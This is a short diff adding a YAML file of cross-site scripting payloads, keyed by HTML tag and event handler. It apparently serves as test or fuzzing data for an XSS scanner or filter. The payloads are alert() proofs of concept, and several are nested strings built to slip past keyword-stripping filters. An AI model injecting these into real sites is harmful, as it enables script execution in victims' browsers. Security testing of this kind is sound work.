@@ -1,0 +1,25 @@
+---
+"svg":
+  "onlonloadoad":
+    payloads:
+      - "<svg/onlonloadoad=oad=alealertrt()>"
+  "onlonloadoad=oad":
+    payloads:
+      - "<svg/onlonloadoad=oad=alealertrt()>"
+  "onload":
+    payloads:
+      - "<svg onload=alert()>"
+      - "<svg/onload=alert()>"
+"img":
+  "onload":
+    payloads:
+      - "<img onload=alert()>"
+  "onerror":
+    payloads:
+      - "<img src=x onerror=alert()>"
+"input":
+  "autofocus":
+    payloads:
+      - "<input autofocus=\"\" onfocus=alert()>"
+---
+
